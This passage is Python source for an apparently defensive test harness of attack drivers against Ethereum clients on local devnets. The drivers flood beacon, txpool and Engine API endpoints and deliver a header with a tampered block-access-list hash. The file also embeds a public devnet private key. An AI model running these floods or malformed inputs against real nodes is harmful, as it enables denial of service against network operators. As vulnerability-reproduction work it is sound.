"""L1 attack-driver contract + registry.

One driver per attack surface, reused across all clients (the input is a
protocol message, which doesn't care what language the client is written in).
Drivers are the only part of the live path that is surface-specific; each is
parameterised entirely by a FindingSpec.

The concrete network implementations need a live devnet target. Most surfaces
remain explicit stubs, while the block-import driver contains the Amsterdam BAL
controls and the EthTotal lifecycle transaction probes. A missing substrate or
an unsupported path raises a clear exception, so a package boot is never
mistaken for delivered attack input.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Protocol, runtime_checkable

from ..schema import AttackSurface, FindingSpec


class DriverNotImplemented(NotImplementedError):
    """Raised when a stub driver's live network path is invoked."""


class AttackNotDelivered(RuntimeError):
    """The live driver ran, but the target never accepted/included the input."""


def make_engine_jwt(secret: bytes) -> str:
    """HS256 JWT for the Engine API (a single ``iat`` claim, per the spec)."""
    import base64
    import hashlib
    import hmac
    import json
    import time

    def b64(b: bytes) -> bytes:
        return base64.urlsafe_b64encode(b).rstrip(b"=")

    header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    payload = b64(json.dumps({"iat": int(time.time())}, separators=(",", ":")).encode())
    signing_input = header + b"." + payload
    sig = b64(hmac.new(secret, signing_input, hashlib.sha256).digest())
    return (signing_input + b"." + sig).decode()


@dataclass
class DriverTarget:
    """Where the driver sends its traffic (filled in by the devnet layer)."""

    enode_or_multiaddr: str = ""
    rpc_url: str = ""
    engine_url: str = ""
    jwt_secret: str = ""
    container_id: str = ""
    # Optional throw-away signer supplied by a purpose-built devnet package.
    # It is kept in memory and is never serialized into evidence.
    lifecycle_private_key: str = ""
    lifecycle_from: str = ""
    lifecycle_mode: str = ""
    staged_target_container_id: str = ""
    evidence_dir: str = ""


@runtime_checkable
class AttackDriver(Protocol):
    surface: AttackSurface
    generators: tuple[str, ...]

    def emit(self, spec: FindingSpec, target: DriverTarget) -> int:
        """Drive the attack described by ``spec`` against ``target``.

        Returns the number of attack units delivered.
        """
        ...


class _StubDriver:
    """Base for drivers whose payload construction works offline but whose
    network send needs a live devnet."""

    surface: AttackSurface
    generators: tuple[str, ...] = ()

    def build_payload(self, spec: FindingSpec):
        """Construct (but do not send) the attack payload — pure, offline."""
        from .payloads import build_payload

        return build_payload(spec.attacker_input.generator, spec.attacker_input.params)

    def emit(self, spec: FindingSpec, target: DriverTarget) -> int:
        # Payload construction is real; only the network send is pending.
        self.build_payload(spec)
        raise DriverNotImplemented(
            f"{self.surface.value} driver (generator={spec.attacker_input.generator!r}) "
            f"builds its payload but needs a live devnet target to send it"
        )


class RlpxDriver(_StubDriver):
    surface = AttackSurface.P2P_RLPX
    generators = ("oversized_frame_body_length",)


class WireDriver(_StubDriver):
    surface = AttackSurface.DEVP2P_WIRE
    generators = ("newblockhashes_flood",)


class GossipDriver(_StubDriver):
    surface = AttackSurface.P2P_GOSSIP
    generators = ("far_future_slot_beacon_block_flood",
                  "singleattestation_oob_attester_index")

    def emit(self, spec: FindingSpec, target: DriverTarget) -> int:
        """Flood far-future-slot BeaconBlocks at the CL's Beacon API.

        Uses the HTTP path from the grandine PoC (POST /eth/v1/beacon/blocks).
        Returns blocks delivered; stops early if the connection drops (OOM).

        LIVE NOTE (2026-06-27, grandine 1.x / Electra devnet): this API path was
        falsified as a repro of PROP-val-eth-003 — the node deserializes and
        version-validates the block (400 before any buffering), so it never
        reaches validate_gossip_rules / delayed_until_slot. A faithful repro
        needs the real libp2p gossipsub path. See reports/findings_index.json
        live_probe. The emit is kept (correct for Beacon-API-delivered floods)
        but is not the right vector for the delayed_until_slot finding.
        """
        import struct
        import urllib.error
        import urllib.request

        from .payloads import _encode_signed_block

        if not target.rpc_url:
            raise DriverNotImplemented("gossip driver needs target.rpc_url (beacon API base)")

        params = spec.attacker_input.params
        count = int(params.get("count", 1000))
        slot = int(params.get("current_slot", 1000)) + int(params.get("slot_offset", 1_000_000))
        url = target.rpc_url.rstrip("/") + "/eth/v1/beacon/blocks"

        sent = 0
        for i in range(count):
            body = _encode_signed_block(slot, struct.pack("<I", i).ljust(32, b"\x00"))
            req = urllib.request.Request(
                url, data=body, method="POST",
                headers={"Content-Type": "application/octet-stream"},
            )
            try:
                urllib.request.urlopen(req, timeout=5).read()
            except urllib.error.HTTPError:
                # 400/415 etc: node rejects the payload but the finding is that
                # it still buffers the future-slot block before validation.
                pass
            except (urllib.error.URLError, ConnectionError, OSError):
                # connection refused -> node likely crashed (OOM) = the symptom.
                break
            sent += 1
        return sent


class TxpoolDriver(_StubDriver):
    surface = AttackSurface.TXPOOL
    generators = ("newpooledtxhashes_hash_flood",)

    def emit(self, spec: FindingSpec, target: DriverTarget) -> int:
        """Flood eth/68 NewPooledTransactionHashes at a real reth node.

        The driver keeps the wire payload compressible so snappy does not
        become the limiting factor. Each announcement message uses a distinct
        hash seed so reth cannot trivially deduplicate repeated sends.
        """
        import multiprocessing as mp
        import re
        import time

        from . import wire
        from .payloads import _compressible_unique_txhash
        from .rlpx.session import ETH_NEW_POOLED_TX_HASHES, Session

        if not target.enode_or_multiaddr:
            raise DriverNotImplemented("txpool driver needs target.enode_or_multiaddr")

        params = spec.attacker_input.params
        hashes_per_msg = int(params.get("count", 450_000))
        workers = int(params.get("workers", 8))
        duration = float(params.get("duration", 30))
        batch_sleep_ms = float(params.get("batch_sleep_ms", 10))
        start_timeout = float(params.get("start_timeout", 60))

        stop = mp.Event()
        start = mp.Event()
        ready = mp.Value("i", 0)
        total_sent = mp.Value("q", 0)

        def _worker(index: int) -> None:
            m = re.match(r"(?:enode://)?([0-9a-fA-F]+)@[^:]+:(\d+)", target.enode_or_multiaddr)
            if not m:
                raise DriverNotImplemented(
                    f"txpool driver needs a reachable enode, got {target.enode_or_multiaddr!r}"
                )
            pub_hex, port_s = m.groups()
            port = int(port_s)
            pub = bytes.fromhex(pub_hex)
            s = Session("127.0.0.1", port, pub)
            s.handshake(timeout=15)
            payload_seed = index * hashes_per_msg
            hashes = [
                _compressible_unique_txhash(payload_seed + i)
                for i in range(hashes_per_msg)
            ]
            body = wire.encode_new_pooled_transaction_hashes_68(hashes)
            with ready.get_lock():
                ready.value += 1
            if not start.wait(timeout=start_timeout):
                s.close()
                return
            deadline = time.time() + duration
            sent = 0
            while not stop.is_set() and time.time() < deadline:
                try:
                    s.write_msg(ETH_NEW_POOLED_TX_HASHES, body)
                    sent += hashes_per_msg
                except Exception:
                    break
                try:
                    s.sock.settimeout(0.01)
                    while True:
                        s.sock.recv(65536)
                except Exception:
                    pass
                if batch_sleep_ms > 0:
                    time.sleep(batch_sleep_ms / 1000.0)
            with total_sent.get_lock():
                total_sent.value += sent
            s.close()

        procs = [mp.Process(target=_worker, args=(i,)) for i in range(workers)]
        for proc in procs:
            proc.start()

        deadline = time.time() + start_timeout
        while time.time() < deadline:
            if ready.value >= workers:
                break
            time.sleep(0.1)
        start.set()
        time.sleep(duration)
        stop.set()
        for proc in procs:
            proc.join(timeout=10)
        return int(total_sent.value)


class EngineDriver(_StubDriver):
    surface = AttackSurface.ENGINE_API
    generators = ("blocking_task_flood",)

    def emit(self, spec: FindingSpec, target: DriverTarget) -> int:
        """Flood a JWT-authenticated Engine API method with an abusive range.

        For RETH-ENG-004: repeated engine_getPayloadBodiesByRangeV1 with a huge
        count ties up the blocking task pool. Needs only JWT + JSON-RPC — no
        valid block construction — so it is the most tractable live repro.
        Returns requests delivered; stops early if the connection drops.
        """
        import json
        import urllib.error
        import urllib.request

        if not target.engine_url or not target.jwt_secret:
            raise DriverNotImplemented("engine driver needs target.engine_url + jwt_secret")

        secret = bytes.fromhex(target.jwt_secret.removeprefix("0x"))
        params = spec.attacker_input.params
        count = int(params.get("count", 100))
        method = params.get("method", "engine_getPayloadBodiesByRangeV1")
        rpc_params = params.get("rpc_params", ["0x1", "0xffffffffffffffff"])
        body = json.dumps(
            {"jsonrpc": "2.0", "method": method, "params": rpc_params, "id": 1}
        ).encode()

        sent = 0
        for _ in range(count):
            req = urllib.request.Request(
                target.engine_url, data=body, method="POST",
                headers={
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {make_engine_jwt(secret)}",
                },
            )
            try:
                urllib.request.urlopen(req, timeout=10).read()
            except urllib.error.HTTPError:
                # the method may error on the abusive range, but the work
                # (and the blocking-pool occupancy) still happened.
                pass
            except (urllib.error.URLError, ConnectionError, OSError):
                break
            sent += 1
        return sent


class BlockImportDriver(_StubDriver):
    surface = AttackSurface.BLOCK_IMPORT
    generators = (
        "unfinalized_fork_block_flood",
        "amsterdam_block_wrong_bal_hash_pipeline",
        "amsterdam_block_wrong_bal_hash_p2p",
        "selfdestruct_then_same_tx_refund",
        "precancun_destroy_then_value_resurrect",
    )

    def __init__(self) -> None:
        # The harness uses this after a live run to persist the exact Engine
        # API responses.  Keeping it on the driver avoids turning a boolean
        # "delivered" count into an unsupported live verdict.
        self.last_evidence: dict[str, object] = {}

    def emit(self, spec: FindingSpec, target: DriverTarget) -> int:
        """Exercise the live BAL controls for reth's Engine and sync paths.

        The pipeline generator submits a canonical Amsterdam payload followed
        by a one-byte BAL tamper through ``engine_newPayloadV5``.  The P2P
        generator instead acts as a sync peer and waits for a
        ``GetBlockHeaders`` request; it never uses ``newPayload`` to deliver
        the malicious header.  A live Engine ``INVALID`` or a successful
        peer handshake alone is not evidence that the staged path is safe.
        """
        import json
        import time
        import urllib.error
        import urllib.request

        if spec.attacker_input.generator == "amsterdam_block_wrong_bal_hash_p2p":
            return self._emit_downloaded_header(spec, target)
        if (spec.attacker_input.generator == "amsterdam_block_wrong_bal_hash_pipeline" and
                target.lifecycle_mode == "reth-staged-import"):
            return self._emit_reth_staged_import(spec, target)
        if spec.attacker_input.generator == "selfdestruct_then_same_tx_refund":
            if target.lifecycle_mode == "besu-json-import":
                return self._emit_besu_json_import(spec, target)
            return self._emit_besu_same_tx_refund(spec, target)
        if spec.attacker_input.generator == "precancun_destroy_then_value_resurrect":
            return self._emit_erigon_precancun_resurrection(spec, target)
        if spec.attacker_input.generator != "amsterdam_block_wrong_bal_hash_pipeline":
            return super().emit(spec, target)
        if not target.rpc_url or not target.engine_url or not target.jwt_secret:
            raise DriverNotImplemented(
                "Amsterdam BAL control needs rpc_url, engine_url, and jwt_secret"
            )

        def call(url: str, method: str, params: list[object]) -> dict:
            headers = {"Content-Type": "application/json"}
            headers["Authorization"] = (
                f"Bearer {make_engine_jwt(bytes.fromhex(target.jwt_secret.removeprefix('0x')))}"
            )
            req = urllib.request.Request(
                url,
                data=json.dumps({"jsonrpc": "2.0", "method": method,
                                 "params": params, "id": 1}).encode(),
                headers=headers,
            )
            try:
                with urllib.request.urlopen(req, timeout=20) as response:
                    return json.loads(response.read())
            except (urllib.error.URLError, urllib.error.HTTPError, TimeoutError) as exc:
                raise DriverNotImplemented(f"live Engine API request failed: {exc}") from exc

        latest = call(target.rpc_url, "eth_getBlockByNumber", ["latest", False])["result"]
        parent = latest["hash"]
        parent_beacon_root = latest.get("parentBeaconBlockRoot") or "0x" + "00" * 32
        attrs = {
            "timestamp": hex(int(latest["timestamp"], 16) + 12),
            "prevRandao": "0x" + "66" * 32,
            "suggestedFeeRecipient": "0x" + "22" * 20,
            "withdrawals": [],
            "parentBeaconBlockRoot": parent_beacon_root,
            "slotNumber": int(latest["number"], 16) + 1,
            "targetGasLimit": int(latest["gasLimit"], 16),
        }
        fcu = call(
            target.engine_url,
            "engine_forkchoiceUpdatedV4",
            [{"headBlockHash": parent, "safeBlockHash": parent,
              "finalizedBlockHash": parent}, attrs],
        )
        payload_id = fcu.get("result", {}).get("payloadId")
        if not payload_id:
            raise DriverNotImplemented(f"Engine API did not return payloadId: {fcu}")
        time.sleep(0.5)
        payload = call(target.engine_url, "engine_getPayloadV6", [payload_id]).get("result", {}).get(
            "executionPayload"
        )
        if not payload or not payload.get("blockAccessList"):
            raise DriverNotImplemented("Engine API did not return an Amsterdam BAL payload")
        self.last_evidence = {
            "fcu_v4": fcu,
            "payload_block_hash": payload.get("blockHash"),
            "payload_block_access_list": payload.get("blockAccessList"),
        }
        # First submit the untouched payload.  This is the live negative
        # control: it must be accepted before the exact same payload is
        # mutated and submitted again.
        valid = call(target.engine_url, "engine_newPayloadV5",
                     [payload.copy(), [], parent_beacon_root, []])
        bal = bytearray.fromhex(payload["blockAccessList"].removeprefix("0x"))
        bal[-1] ^= 1
        payload["blockAccessList"] = "0x" + bal.hex()
        tampered = call(target.engine_url, "engine_newPayloadV5",
                        [payload, [], parent_beacon_root, []])
        self.last_evidence.update({
            "valid_new_payload_v5": valid,
            "tampered_new_payload_v5": tampered,
            "tamper": "last byte of RLP-encoded blockAccessList flipped",
        })
        return 1

    def _emit_reth_staged_import(self, spec: FindingSpec, target: DriverTarget) -> int:
        """Import a malformed Amsterdam block through reth's real staged pipeline.

        The source node produces block 1 from the same custom Amsterdam genesis;
        the driver rewrites only the header BAL hash and invokes ``reth import``
        in a fresh target database. This reaches Headers/Bodies/Execution rather
        than Engine API ``newPayload``.
        """
        import subprocess
        from pathlib import Path

        if not target.rpc_url or not target.staged_target_container_id:
            raise DriverNotImplemented(
                "reth staged import needs source rpc_url and a target container"
            )
        import time

        block = None
        deadline = time.time() + 30
        while time.time() < deadline:
            block = self._rpc(target.rpc_url, "eth_getBlockByNumber", ["0x1", False])
            if isinstance(block, dict):
                break
            time.sleep(0.5)
        if not isinstance(block, dict):
            raise DriverNotImplemented(f"source block 1 unavailable: {block!r}")

        def raw(value: str, fixed: int | None = None) -> bytes:
            hexed = value.removeprefix("0x")
            if len(hexed) % 2:
                hexed = "0" + hexed
            data = bytes.fromhex(hexed)
            return data.rjust(fixed, b"\x00") if fixed is not None else data.lstrip(b"\x00")

        def rlp_bytes(data: bytes) -> bytes:
            if len(data) == 1 and data[0] < 0x80:
                return data
            if len(data) < 56:
                return bytes([0x80 + len(data)]) + data
            size = (len(data).bit_length() + 7) // 8
            return bytes([0xB7 + size]) + len(data).to_bytes(size, "big") + data

        def rlp_list(payload: bytes) -> bytes:
            if len(payload) < 56:
                return bytes([0xC0 + len(payload)]) + payload
            size = (len(payload).bit_length() + 7) // 8
            return bytes([0xF7 + size]) + len(payload).to_bytes(size, "big") + payload

        def quantity(name: str) -> bytes:
            return raw(str(block[name]))

        fields = [
            raw(block["parentHash"]), raw(block["sha3Uncles"]), raw(block["miner"]),
            raw(block["stateRoot"]), raw(block["transactionsRoot"]), raw(block["receiptsRoot"]),
            raw(block["logsBloom"], 256), quantity("difficulty"), quantity("number"),
            quantity("gasLimit"), quantity("gasUsed"), quantity("timestamp"),
            raw(block["extraData"]), raw(block["mixHash"]), raw(block["nonce"], 8),
            quantity("baseFeePerGas"), raw(block["withdrawalsRoot"]), quantity("blobGasUsed"),
            quantity("excessBlobGas"), raw(block["parentBeaconBlockRoot"]),
            raw(block["requestsHash"]), bytes([0x42]) * 32, quantity("slotNumber"),
        ]
        header = rlp_list(b"".join(rlp_bytes(field) for field in fields))
        malformed = rlp_list(header + rlp_list(b"") + rlp_list(b"") + rlp_list(b""))
        run_dir = Path(getattr(target, "evidence_dir", "."))
        # The live helper supplies a per-run evidence directory through this
        # private attribute; fall back to /tmp only for direct driver tests.
        path = run_dir / "reth-malformed-amsterdam-block.rlp"
        path.write_bytes(malformed)
        copied = subprocess.run(
            ["docker", "cp", str(path), f"{target.staged_target_container_id}:/malformed.rlp"],
            capture_output=True, text=True, timeout=30,
        )
        if copied.returncode != 0:
            raise DriverNotImplemented(f"docker cp failed: {copied.stderr.strip()}")
        cmd = [
            "docker", "exec", target.staged_target_container_id, "reth", "import",
            "--chain", "/genesis/genesis.json", "--datadir", "/data", "--no-state",
            "--fail-on-invalid-block", "/malformed.rlp",
        ]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        output = proc.stdout + "\n" + proc.stderr
        self.last_evidence = {
            "delivery": "reth import staged pipeline",
            "source_block": block.get("number"),
            "source_block_hash": block.get("hash"),
            "malformed_block_bal_hash": "0x" + "42" * 32,
            "import_returncode": proc.returncode,
            "fully_imported": "Chain was fully imported" in output,
            "import_output_tail": output[-4000:],
        }
        return 1 if proc.returncode == 0 and self.last_evidence["fully_imported"] else 0

    def _emit_downloaded_header(self, spec: FindingSpec, target: DriverTarget) -> int:
        """Act as a sync peer and answer reth's GetBlockHeaders request.

        POS reth rejects NewBlock announcements before decoding, so a faithful
        test must advertise a higher head in the eth status handshake and wait
        for the victim's request/response downloader path.  The header is
        assembled from an Amsterdam payload produced by the victim's own
        Engine API; only the BAL hash is replaced before RLP encoding.
        """
        import re
        import time

        from Crypto.Hash import keccak

        from . import wire
        from .rlp import decode, encode
        from .rlpx.session import (
            ETH_BLOCK_BODIES, ETH_BLOCK_HEADERS, ETH_GET_BLOCK_BODIES,
            ETH_GET_BLOCK_HEADERS, ETH_NEW_BLOCK_HASHES, Session,
        )

        if not target.rpc_url or not target.engine_url or not target.jwt_secret:
            raise DriverNotImplemented(
                "Amsterdam P2P header driver needs rpc_url, engine_url, and jwt_secret"
            )
        match = re.search(r"(?:enode://)?([0-9a-fA-F]{128})@[^:]+:(\d+)$",
                          target.enode_or_multiaddr)
        if not match:
            raise DriverNotImplemented(
                f"Amsterdam P2P header driver needs a reachable enode, got {target.enode_or_multiaddr!r}"
            )
        remote_pub = bytes.fromhex(match.group(1))
        port = int(match.group(2))

        # Reuse the Engine API only as a payload factory.  The malicious input
        # is delivered later through eth/68 sync response, not newPayload.
        def call(url: str, method: str, params: list[object]) -> dict:
            import json
            import urllib.error
            import urllib.request

            headers = {"Content-Type": "application/json",
                       "Authorization": f"Bearer {make_engine_jwt(bytes.fromhex(target.jwt_secret.removeprefix('0x')))}"}
            req = urllib.request.Request(
                url, data=json.dumps({"jsonrpc": "2.0", "method": method,
                                      "params": params, "id": 1}).encode(),
                headers=headers,
            )
            try:
                with urllib.request.urlopen(req, timeout=20) as response:
                    return json.loads(response.read())
            except (urllib.error.URLError, urllib.error.HTTPError, TimeoutError) as exc:
                raise DriverNotImplemented(f"live Engine API request failed: {exc}") from exc

        latest = call(target.rpc_url, "eth_getBlockByNumber", ["latest", False])["result"]
        parent = latest["hash"]
        parent_beacon_root = latest.get("parentBeaconBlockRoot") or "0x" + "00" * 32
        attrs = {
            "timestamp": hex(int(latest["timestamp"], 16) + 12),
            "prevRandao": "0x" + "66" * 32,
            "suggestedFeeRecipient": "0x" + "22" * 20,
            "withdrawals": [],
            "parentBeaconBlockRoot": parent_beacon_root,
            "slotNumber": int(latest["number"], 16) + 1,
            "targetGasLimit": int(latest["gasLimit"], 16),
        }
        fcu = call(
            target.engine_url, "engine_forkchoiceUpdatedV4",
            [{"headBlockHash": parent, "safeBlockHash": parent,
              "finalizedBlockHash": parent}, attrs],
        )
        payload_id = fcu.get("result", {}).get("payloadId")
        if not payload_id:
            raise DriverNotImplemented(f"Engine API did not return payloadId: {fcu}")
        time.sleep(0.5)
        payload = call(target.engine_url, "engine_getPayloadV6", [payload_id]).get("result", {}).get(
            "executionPayload"
        )
        if not payload or not payload.get("blockAccessList"):
            raise DriverNotImplemented("Engine API did not return an Amsterdam BAL payload")

        def b256(name: str, default: bytes = bytes(32)) -> bytes:
            value = payload.get(name)
            if value is None:
                return default
            return bytes.fromhex(value.removeprefix("0x").zfill(64))

        def addr(name: str) -> bytes:
            value = payload.get(name, "0x" + "00" * 20)
            return bytes.fromhex(value.removeprefix("0x").zfill(40))

        def quantity(name: str, default: int = 0) -> int:
            value = payload.get(name)
            return default if value is None else int(value, 16) if isinstance(value, str) else int(value)

        def digest(data: bytes) -> bytes:
            h = keccak.new(digest_bits=256)
            h.update(data)
            return h.digest()

        empty_ommer_hash = digest(encode([]))
        empty_trie_root = bytes.fromhex(
            "56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421"
        )
        requests = [bytes.fromhex(x.removeprefix("0x"))
                    for x in (payload.get("requests") or [])]
        requests_hash = digest(encode(requests))
        # The target package builds an empty payload, so the empty transaction
        # and receipt roots are exact.  Refuse to send a fabricated root if a
        # future package starts inserting transactions into the payload.
        if payload.get("transactions"):
            raise DriverNotImplemented("P2P header driver requires an empty generated payload")
        wrong_bal_hash = bytes([0x42]) * 32
        header_items = [
            b256("parentHash", bytes.fromhex(parent.removeprefix("0x"))),
            empty_ommer_hash,
            addr("feeRecipient"),
            b256("stateRoot"),
            empty_trie_root,
            b256("receiptsRoot", empty_trie_root),
            bytes(256),
            quantity("difficulty"),
            quantity("blockNumber"),
            quantity("gasLimit"),
            quantity("gasUsed"),
            quantity("timestamp"),
            bytes.fromhex(payload.get("extraData", "0x").removeprefix("0x")),
            b256("prevRandao"),
            bytes(8),
            quantity("baseFeePerGas"),
            empty_trie_root,
            quantity("blobGasUsed"),
            quantity("excessBlobGas"),
            b256("parentBeaconBlockRoot"),
            requests_hash,
            wrong_bal_hash,
            quantity("slotNumber", attrs["slotNumber"]),
        ]
        header = encode(header_items)
        # encode(header_items) is the payload list only; the wire body needs
        # the RLP list prefix, which the generic encoder already added above.
        malicious_hash = digest(header)

        session = Session("127.0.0.1", port, remote_pub)
        seen: list[str] = []
        disconnect_reason: object | None = None

        def jsonable(value: object) -> object:
            if isinstance(value, bytes):
                return "0x" + value.hex()
            if isinstance(value, list):
                return [jsonable(item) for item in value]
            if isinstance(value, tuple):
                return [jsonable(item) for item in value]
            if isinstance(value, dict):
                return {str(key): jsonable(item) for key, item in value.items()}
            return value

        headers_sent = False
        try:
            # A non-zero TD makes the synthetic peer look strictly ahead to
            # clients whose POS sync scheduler still compares the legacy TD
            # field before considering the advertised head.
            session.handshake(timeout=15, advertised_head=malicious_hash,
                              advertised_td=1,
                              advertised_latest=quantity("blockNumber"))
            # Status alone is not a block announcement.  NewBlockHashes is
            # the normal eth/68 trigger that makes a fully-synced POS node
            # schedule a header fetch from this peer.
            session.write_msg(
                ETH_NEW_BLOCK_HASHES,
                wire.encode_new_block_hashes(
                    [(malicious_hash, quantity("blockNumber") + 1)]
                ),
            )
            session.sock.settimeout(8)
            deadline = time.time() + 12
            while time.time() < deadline:
                try:
                    msg_id, body = session.read_msg()
                except (TimeoutError, OSError, ConnectionError):
                    break
                seen.append(hex(msg_id))
                if msg_id == 0x01:  # p2p Disconnect
                    disconnect_reason = jsonable(decode(body)) if body else []
                    break
                if msg_id == ETH_GET_BLOCK_HEADERS:
                    request = decode(body)
                    request_id = int.from_bytes(request[0], "big") if request[0] else 0
                    session.write_msg(ETH_BLOCK_HEADERS,
                                      wire.encode_block_headers(request_id, [header]))
                    headers_sent = True
                elif msg_id == ETH_GET_BLOCK_BODIES:
                    request = decode(body)
                    request_id = int.from_bytes(request[0], "big") if request[0] else 0
                    session.write_msg(ETH_BLOCK_BODIES,
                                      wire.encode_block_bodies(request_id, []))
                else:
                    # Status/unsupported broadcasts are not relevant to the
                    # header response; leave the session alive for the sync request.
                    continue
        finally:
            session.close()
        self.last_evidence = {
            "advertised_head": "0x" + malicious_hash.hex(),
            "header_bal_hash": "0x" + wrong_bal_hash.hex(),
            "delivery": "eth/68 GetBlockHeaders -> BlockHeaders",
            "headers_sent": headers_sent,
            "messages_seen": seen,
            "announcement_sent": True,
            "disconnect_reason": disconnect_reason,
            "fcu_v4": fcu,
        }
        return 1 if headers_sent else 0

    # --- lifecycle transaction probes ---------------------------------
    # These two probes intentionally use the public devnet prefunded key
    # shipped by ethereum-package.  It is a throw-away test key, not an
    # operator secret.  We keep it local to the driver and never persist it
    # in evidence.
    _DEVNET_KEY = "bcdf20249abf0ed6d944c0288fad489e33f66b3960d9e6229c1cd214ed3bbe31"
    _DEVNET_FROM = "0x8943545177806ED17B9F23F0a21ee5948eCaa776"
    _DEVNET_BENEFICIARY = "0xE25583099BA105D9ec0A67f5Ae86D90e50036425"

    @staticmethod
    def _rpc(url: str, method: str, params: list[object] | None = None) -> object:
        import json
        import urllib.error
        import urllib.request

        req = urllib.request.Request(
            url,
            data=json.dumps({"jsonrpc": "2.0", "method": method,
                             "params": params or [], "id": 1}).encode(),
            headers={"Content-Type": "application/json"},
        )
        try:
            with urllib.request.urlopen(req, timeout=20) as response:
                body = json.loads(response.read())
        except (urllib.error.URLError, urllib.error.HTTPError, TimeoutError) as exc:
            raise DriverNotImplemented(f"lifecycle RPC failed: {exc}") from exc
        if "error" in body:
            raise DriverNotImplemented(f"{method} returned RPC error: {body['error']}")
        return body.get("result")

    @staticmethod
    def _receipt(rpc_url: str, tx_hash: str, *, timeout: float = 120) -> dict:
        import time

        deadline = time.time() + timeout
        while time.time() < deadline:
            receipt = BlockImportDriver._rpc(
                rpc_url, "eth_getTransactionReceipt", [tx_hash]
            )
            if receipt:
                return receipt
            time.sleep(1)
        raise AttackNotDelivered(f"transaction receipt timeout: {tx_hash}")

    @staticmethod
    def _cast_send(target: DriverTarget, args: list[str]) -> str:
        import re
        import shutil
        import subprocess

        cast = shutil.which("cast")
        if not cast:
            raise DriverNotImplemented("lifecycle probe requires the Foundry cast binary")
        private_key = target.lifecycle_private_key or BlockImportDriver._DEVNET_KEY
        cmd = [cast, "send", "--async", "--private-key",
               private_key, "--rpc-url", target.rpc_url,
               "--gas-limit", "800000"] + args
        proc = subprocess.run(cmd, text=True, capture_output=True, timeout=90)
        if proc.returncode != 0:
            raise DriverNotImplemented(
                f"cast transaction failed: {proc.stderr.strip()[-500:]}"
            )
        match = re.search(r"0x[0-9a-fA-F]{64}", proc.stdout)
        if not match:
            raise DriverNotImplemented(f"cast did not return a transaction hash: {proc.stdout!r}")
        return match.group(0)

    @staticmethod
    def _engine_rpc(target: DriverTarget, method: str,
                    params: list[object]) -> dict:
        import json
        import urllib.error
        import urllib.request

        if not target.engine_url or not target.jwt_secret:
            raise DriverNotImplemented("pending-tx miner needs Engine API credentials")
        req = urllib.request.Request(
            target.engine_url,
            data=json.dumps({"jsonrpc": "2.0", "method": method,
                             "params": params, "id": 1}).encode(),
            headers={
                "Content-Type": "application/json",
                "Authorization": (
                    "Bearer " + make_engine_jwt(
                        bytes.fromhex(target.jwt_secret.removeprefix("0x"))
                    )
                ),
            },
        )
        try:
            with urllib.request.urlopen(req, timeout=20) as response:
                body = json.loads(response.read())
        except (urllib.error.URLError, urllib.error.HTTPError, TimeoutError) as exc:
            raise DriverNotImplemented(f"Engine API request failed: {exc}") from exc
        if "error" in body:
            raise DriverNotImplemented(f"{method} returned RPC error: {body['error']}")
        return body

    def _force_include_pending(self, target: DriverTarget) -> dict[str, object]:
        """Build and canonicalize one pending-tx payload through Engine API.

        This is a liveness aid for the lifecycle probes, not the vulnerability
        oracle.  It makes receipt acquisition deterministic when the CL in a
        freshly booted Kurtosis enclave has not proposed its first slot yet.
        The method tries the post-Shanghai API versions in descending order and
        records the exact version that accepted the payload.
        """
        import time

        if target.lifecycle_mode == "besu-clique":
            # The dedicated Besu lifecycle package is a single-validator
            # Clique chain.  Its local block producer includes the txpool on
            # its one-second PoA schedule; there is intentionally no CL/Engine
            # API in this historical-fork reachability target.
            time.sleep(2)
            latest = self._rpc(target.rpc_url, "eth_getBlockByNumber", ["latest", False])
            return {"mode": "besu-clique-auto", "latest": latest}

        latest = self._rpc(target.rpc_url, "eth_getBlockByNumber", ["latest", False])
        if not isinstance(latest, dict) or not latest.get("hash"):
            raise AttackNotDelivered("target has no usable latest block")
        chain_config: object | None = None
        try:
            chain_config = self._rpc(target.rpc_url, "eth_chainConfig")
        except DriverNotImplemented:
            pass
        parent = latest["hash"]
        parent_beacon_root = latest.get("parentBeaconBlockRoot") or "0x" + "00" * 32
        common_attrs = {
            "timestamp": hex(int(latest["timestamp"], 16) + 12),
            "prevRandao": "0x" + "66" * 32,
            "suggestedFeeRecipient": self._DEVNET_BENEFICIARY,
            "withdrawals": latest.get("withdrawals") or [],
            "parentBeaconBlockRoot": parent_beacon_root,
        }
        variants = [
            ("V4", "V6", "V5", {
                **common_attrs,
                "slotNumber": hex(int(latest["number"], 16) + 1),
                "targetGasLimit": hex(int(latest["gasLimit"], 16)),
            }, 4),
            ("V3", "V3", "V3", common_attrs, 3),
            ("V2", "V2", "V2", {
                "timestamp": common_attrs["timestamp"],
                "prevRandao": common_attrs["prevRandao"],
                "suggestedFeeRecipient": common_attrs["suggestedFeeRecipient"],
                "withdrawals": common_attrs["withdrawals"],
            }, 2),
            ("V1", "V1", "V1", {
                "timestamp": common_attrs["timestamp"],
                "prevRandao": common_attrs["prevRandao"],
                "suggestedFeeRecipient": common_attrs["suggestedFeeRecipient"],
                "withdrawals": common_attrs["withdrawals"],
            }, 1),
        ]
        errors: list[str] = []
        for fcu_v, get_v, new_v, attrs, version in variants:
            try:
                fcu = self._engine_rpc(
                    target, f"engine_forkchoiceUpdated{fcu_v}",
                    [{"headBlockHash": parent, "safeBlockHash": parent,
                      "finalizedBlockHash": parent}, attrs],
                )
                payload_id = fcu.get("result", {}).get("payloadId")
                if not payload_id:
                    errors.append(f"{fcu_v}: no payloadId")
                    continue
                time.sleep(0.5)
                got = self._engine_rpc(
                    target, f"engine_getPayload{get_v}", [payload_id]
                ).get("result") or {}
                payload = got.get("executionPayload", got)
                if not payload or not payload.get("blockHash"):
                    errors.append(f"{get_v}: no executionPayload")
                    continue
                if version >= 5:
                    new_params = [payload, [], parent_beacon_root, []]
                elif version == 3:
                    new_params = [payload, [], parent_beacon_root]
                elif version == 2:
                    new_params = [payload, []]
                else:
                    new_params = [payload]
                new_payload = self._engine_rpc(
                    target, f"engine_newPayload{new_v}", new_params
                )
                status = (new_payload.get("result") or {}).get("status")
                if status not in ("VALID", "ACCEPTED"):
                    errors.append(f"{new_v}: {status}")
                    continue
                updated = self._engine_rpc(
                    target, f"engine_forkchoiceUpdated{fcu_v}",
                    [{"headBlockHash": payload["blockHash"],
                      "safeBlockHash": payload["blockHash"],
